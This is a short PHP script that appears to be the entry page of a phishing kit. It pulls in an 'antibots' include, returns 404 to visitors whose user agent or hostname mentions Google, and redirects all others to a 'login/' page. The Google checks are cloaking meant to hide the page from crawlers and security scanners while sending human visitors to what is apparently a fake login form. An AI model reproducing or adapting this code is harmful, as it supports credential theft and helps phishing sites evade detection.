<?php 
session_start();
error_reporting(0);
########################################################
################ [+] INCLUDE FILES [+] #################
########################################################
include('antibots/all_antibots.php');
############### [+] HTTP_USER_AGENT [+] ################
########################################################
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
########################################################
$praga=rand();
$praga=md5($praga);
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
header("location: login/");
?>